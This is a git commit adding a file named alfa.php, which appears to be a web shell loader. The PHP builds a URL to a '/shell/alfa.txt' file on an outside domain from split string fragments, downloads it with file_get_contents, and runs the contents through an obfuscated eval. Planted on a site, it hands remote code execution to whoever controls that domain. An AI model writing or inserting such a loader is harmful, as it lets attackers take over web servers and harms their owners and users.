157528d48a038cc0d8f6a6365f2e2f5b88507c50
lanthau <figththelast@gmail.com>
2025-01-12 14:36:25 +0700

    Create alfa.php

---
+++ alfa.php
@@ -0,0 +1,14 @@
+<?php
+$a = 'wget';
+$b = 'https';
+$c = '://';
+$d = 'hypocrite';
+$e = 'SEO.info';
+$f = '/shell/';
+$g = 'alfa.txt';
+$j = '' . $b . '' . $c . '' . $d . '' . $e . '' . $f . '' . $g;
+$k = 'ev' . 'al';
+$l = file_get_contents($j);
+$l = '?> ' . $l;
+/****/@null;
+/********/@eval/****/($l);?>
